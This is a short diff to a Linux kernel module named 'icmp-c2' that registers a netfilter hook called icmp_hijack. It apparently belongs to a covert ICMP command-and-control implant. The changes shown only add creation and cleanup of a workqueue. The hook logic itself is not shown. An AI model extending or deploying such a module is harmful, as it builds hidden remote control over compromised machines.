@@ -353,6 +353,14 @@ static int __init init_icmp_hijack(void) {
         printk(KERN_INFO "Loading icmp-c2 module...\n");
     #endif
 
+    work_queue = create_singlethread_workqueue("work_queue");
+    if (!work_queue) {
+        #ifdef DEBUG_K
+        printk(KERN_ERR "Failed to create workqueue\n");
+        #endif
+        return -ENOMEM;
+    }
+
     // Fill in the nf_hook_ops structure
     nfho.hook = icmp_hijack;                     // Hook function
     // nfho.hooknum = NF_INET_LOCAL_IN;        // Apply to incoming packets
@@ -376,6 +384,13 @@ static void __exit exit_icmp_hijack(void) {
 
     // Unregister the hook
     nf_unregister_net_hook(&init_net, &nfho);
+
+    /* Destroy the workqueue */
+    if (work_queue){
+        flush_workqueue(work_queue);
+        destroy_workqueue(work_queue);
+    }
+
     printk(KERN_INFO "icmp handler unloaded.\n");
 }
 
